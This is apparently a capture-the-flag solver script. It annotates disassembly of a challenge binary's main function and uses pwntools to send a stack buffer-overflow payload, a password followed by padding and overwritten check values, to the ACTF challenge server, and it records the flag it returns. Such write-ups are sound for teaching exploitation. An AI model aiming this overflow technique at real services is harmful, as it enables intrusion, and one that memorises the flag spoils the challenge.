# 327: int main (int argc, char **argv, char **envp);
# ; var char *format @ rbp-0xe0
# ; var char *s1 @ rbp-0x60
# ; var file*stream @ rbp-0x20
# ; var uint32_t var_14h @ rbp-0x14
# ; var uint32_t var_10h @ rbp-0x10
# ; var uint32_t var_ch @ rbp-0xc
# ; var uint32_t var_8h @ rbp-0x8
# ; var uint32_t var_4h @ rbp-0x4
# 0x00401235      cmp     dword [var_4h], 0x32
# 0x00401239      jne     0x4012c1
# 0x0040123f      cmp     dword [var_8h], 0x37
# 0x00401243      jne     0x4012c1
# 0x00401245      cmp     dword [var_ch], 0xf5
# 0x0040124c      jne     0x4012c1
# 0x0040124e      cmp     dword [var_10h], 0x3d
# 0x00401252      jne     0x4012c1
# 0x00401254      cmp     dword [var_14h], 0x11
# Need to fill buffer with beginning b'password123\0x00' up to offset 0x60-0x14
# and then add the sanity values

from pwn import *
password = b'password123\x00'
padding = b'A'*64
sanity_checks = b'\x11\x00\x00\x00'\
                +b'\x3d\x00\x00\x00'\
                +b'\xf5\x00\x00\x00'\
                +b'\x37\x00\x00\x00'\
                +b'\x32\x00\x00\x00'
payload = password+padding+sanity_checks

conn = remote('shell.actf.co', 21303)
conn.sendline(payload)
response = conn.recvline()
print(response)
response = conn.recvline()
print(response)
# Returns actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}
